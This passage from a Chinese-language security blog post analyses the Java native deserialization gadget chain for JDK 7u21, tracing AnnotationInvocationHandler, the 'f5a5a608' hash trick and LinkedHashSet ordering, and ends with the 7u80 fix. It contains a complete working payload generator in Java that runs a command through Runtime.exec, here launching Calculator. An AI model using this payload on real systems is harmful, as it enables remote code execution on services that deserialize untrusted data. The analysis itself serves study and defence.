<p>再结合同样在 CC 中用过的 AnnotationInvocationHandler 和动态代理，我们可以实现第二个 RCE demo</p>
<p><strong>Level-1 demo</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// javassist fake Code</span></span><br><span class="line">      <span class="comment">// proxy fake Code</span></span><br><span class="line">        proxy.equals(templates);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>从正向思维来看，先谈一下为什么要用 <code>equals</code> 来触发 </p>
<p>核心原因是动态代理触发 <code>AnnotationInvocationHandler#invoke</code>是这些 if 判断和参数附值。可以看出来 <code>var4</code> 需要等于 <code>equals</code>，也就是我们需要调用这个方法才行，后面的 <code>this.equalsImpl(var3[0]);</code> 是一个关键方法，此时 <code>var3[0]</code> 是我们 POC 中的 <code>equals</code>传入的参数，也就是 <code>templates</code></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214174341040.png"></p>
<p><code>AnnotationInvocationHandler#equalsImpl</code> 这里会循环遍历 <code>javax.xml.transform.Templates</code> 中的方法，被我们传入的  <code>templates</code> 调用</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214175058607.png" alt="image-20210214175058607"></p>
<p>后续寻找调用链要找到可以传入一个 proxy，同时调用 equals 方法，而且还能传入参数的地方</p>
<p>这里看一下 LinkedHashSet，其继承自 HashSet ，因为我们要找到满足调用链的方法，LinkedHashSet 是有序的所以这里使用它，构造方法直接调用自父类</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216162034161.png"></p>
<p>其实现序列化和反序列化的逻辑也都存在在父类中，我们之前在 CC 中分析过 HashSet</p>
<p>其反序列化时会恢复键值对，并调用 HashMap 的 put 方法，将其放入 HashMap 中</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210219204734743.png"></p>
<p><code>HashMap#put</code> 是我们调用的关键地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 判断 key 是否为null</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">  <span class="comment">// 计算 key 的 hash</span></span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心语句为 <code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code> ，这里 <code>key.equals(k)</code> 是我们反序列化 POC 想调用的一个结构</p>
<p>因此根据逻辑运算符的短路特性，我们需要满足第一个条件，需要不满足第二个条件，那么才会调用到第三个条件</p>
<p>这里会有两次循环，先看第一次循环，第一次循环，key 为我们的 POC 的 <code>testTarget.add(templates);</code> 的 TemplatesImpl 对象，由于当前 table 变量指向的 Entry 对象是空的，所以 e 是为null，因此不满足 for 循环条件，在后面会调用 <code>addEntry</code> 添加进 table，table是一个Entry数组，用来存放我们通过<code>map.put()</code>传入的键值对，并作为后续判断新传入的键值对和旧键值对是否重复的依据</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220151023288.png"></p>
<p>第二次循环为了满足 <code>e != null</code> 那么需要控制 i 的值，使其能从 table 里面取出相应的对象，那么需要控制两次循环中 hash 之后的值相等</p>
<p>先看第一次循环中计算 hash 值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">        &#125;</span><br><span class="line">        h = hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二次循环计算 hash 值时，由于代理对象没有 hashCode 方法，会相应调用反射来解决，最终调用到 <code>AnnotationInvocationHandler#hashCodeImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashCodeImpl:<span class="number">294</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:<span class="number">64</span>, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">hashCode:-<span class="number">1</span>, $Proxy1 (com.sun.proxy)</span><br><span class="line">hash:<span class="number">351</span>, HashMap (java.util)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220160741224.png"></p>
<blockquote>
<p>此时的var2是一个Iterator对象，用来遍历memberValues对象中存储的键值对，可以看到memberValues中只有一个键值对就是，就是我们在初期通过反射生成 AnnotationInvocationHandler 对象时传入的 HashMap 对象中的那个键值对 </p>
</blockquote>
<p>key是一个字符串”f5a5a608” </p>
<p>Value值是和第一次循环时用来计算hash值的同一个TemplatesImpl对象</p>
<p>看一下具体 hash 值的计算</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</span><br></pre></td></tr></table></figure>

<p>具体分为了两段</p>
<ol>
<li><code>127 * ((String)var3.getKey()).hashCode()</code></li>
<li><code>memberValueHashCode(var3.getValue()</code></li>
</ol>
<p>第二段由于 Value 为计算hash值的同一个TemplatesImpl对象，因此计算出来跟之前的相等</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210220162047284.png"></p>
<p>一个小 trick 是：0和任何数字进行异或，得到的结果都是被异或数本身</p>
<p>那么只要控制第一段结果为 0 ，那么算出来异或值不变，那么结合我们之前说的trick，var3 此刻的 key 为 <code>f5a5a608</code>，因此跟任何数相乘都为 0</p>
<p>回到我们 <code>HashMap#put</code> 的 <code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code></p>
<p>第一个判断为 hash 判断，我们刚刚通过构造已经让其相等了</p>
<p>第二个判断将第一次循环时的 key 取出和第二次循环时的 key 比较，第一次循环的key是TemplatesImpl对象，而第二次循环时 key 为 Proxy 对象，所以结果为flase</p>
<p>最后调用 <code>key.equals(k)</code>，这里的 key 为第二次循环的，k 为第一次循环的，因此总结了需要使用一个有序的HashSet，也就是我们的 LinkedHashSet。这样才能保证我们的调用先后</p>
<p><strong>JDK 7u21 payload</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        Map testMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Constructor aih_construct = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        aih_construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler testHandler = (InvocationHandler) aih_construct.newInstance(Override.class, testMap);</span><br><span class="line">        setFieldValue(testHandler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Templates.class&#125;, testHandler);</span><br><span class="line"><span class="comment">//        proxy.equals(templates);</span></span><br><span class="line">        String magicStr = <span class="string">&quot;f5a5a608&quot;</span>;</span><br><span class="line">        HashSet testTarget = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        testTarget.add(templates);</span><br><span class="line">        testTarget.add(proxy);</span><br><span class="line">        testMap.put(magicStr, templates);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(testTarget);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget Chain</span><br><span class="line">    LinkedHashSet.readObject()</span><br><span class="line">    LinkedHashSet.add()</span><br><span class="line">        ...</span><br><span class="line">        TemplatesImpl.hashCode() (X)</span><br><span class="line">    LinkedHashSet.add()</span><br><span class="line">        ...</span><br><span class="line">        Proxy(Templates).hashCode() (X)</span><br><span class="line">            AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">            AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">                String.hashCode() (<span class="number">0</span>)</span><br><span class="line">                AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">                TemplatesImpl.hashCode() (X)</span><br><span class="line">        Proxy(Templates).equals()</span><br><span class="line">            AnnotationInvocationHandler.invoke()</span><br><span class="line">            AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">                Method.invoke()</span><br><span class="line">                ...</span><br><span class="line">                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                    TemplatesImpl.newTransformer()</span><br><span class="line">                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                        TemplatesImpl.defineTransletClasses()</span><br><span class="line">                            ClassLoader.defineClass()</span><br><span class="line">                            Class.newInstance()</span><br><span class="line">                            ...</span><br><span class="line">                                MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                                ...</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>



<h2 id="FIX"><a href="#FIX" class="headerlink" title="FIX"></a>FIX</h2><p>7u80版本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>对 <code>this.type</code> 进行了校验必须为 Annotation.class，同时增加了异常抛出，会导致我们反序列化的失败</p>
<blockquote>
<p>7u25-b01、7u25-b02尚未如此修补，341行处仍在return。有些文章说修补方案是检<br>查了AnnotationInvocationHandler.type，估计他们是根据抛出的异常这么说的。事<br>实上对AnnotationInvocationHandler.type的检查一直存在，要求type与<br>java.lang.annotation.Annotation有派生、继承、实现关系，但7u25-b03之前发现<br>问题后抛出的异常被341行的catch捕捉之后没有继续抛异常，而是return了</p>
</blockquote>
<p>后续 JRE8u20 对此进行了绕过，通过构造畸型序列化数据，使得针对 <code>AnnotationInvocationHandler.type</code> 的检查被命中时所抛出的异常被 <code>BeanContextSupport.readChildren()</code> 中的 <code>try/catch</code> 块捕获并 continue，但构造过于复杂，且没有新的 gadget，因此不在本文探讨范围内</p>
<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3847">https://xz.aliyun.com/t/3847</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p><a target="_blank" rel="noopener" href="http://scz.617.cn/">http://scz.617.cn/</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Serialization-and-Deserialization"><span class="toc-number">1.</span> <span class="toc-text">Serialization and Deserialization</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JDK-7u21-Gadget-Chain"><span class="toc-number">2.</span> <span class="toc-text">JDK 7u21 Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basics"><span class="toc-number">2.1.</span> <span class="toc-text">Basics</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gadget-chain"><span class="toc-number">2.2.</span> <span class="toc-text">Gadget chain</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FIX"><span class="toc-number">2.3.</span> <span class="toc-text">FIX</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REF"><span class="toc-number">3.</span> <span class="toc-text">REF</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&text=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析&body=Check out this article: http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&name=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析&description=&lt;p&gt;本篇梳理了 Java 原生反序列化相关知识，同时分析了 JDK 7u21利用链&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&t=深入 Java 原生反序列化 &amp; JDK7u21 利用链分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 M13n
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
